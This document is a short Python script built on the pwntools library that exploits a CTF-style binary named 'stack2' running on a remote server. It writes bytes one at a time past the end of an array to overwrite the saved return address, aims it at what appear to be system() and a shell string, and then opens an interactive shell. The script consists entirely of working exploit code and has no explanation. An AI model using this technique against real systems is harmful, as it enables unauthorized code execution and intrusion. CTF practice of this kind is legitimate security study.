#!/usr/bin/env python
from pwn import *

context.log_level = "debug"

#sh = process("./stack2")
sh = remote("111.198.29.45",53413)

sys_addr = 0x0804859b

sh.recv()
sh.sendline('1')
sh.recv()
sh.sendline('1')

def fuck(index, value):
    sh.sendline("3")
    sh.recv()
    sh.sendline(str(index))
    sh.recv()
    sh.sendline(str(value))
    sh.recv()

fuck(0x84, 0x50)
fuck(0x85, 0x84)
fuck(0x86, 0x04)
fuck(0x87, 0x08)

fuck(0x8c, 0x87)
fuck(0x8d, 0x89)
fuck(0x8e, 0x04)
fuck(0x8f, 0x08)

sh.sendline("5")

sh.interactive()
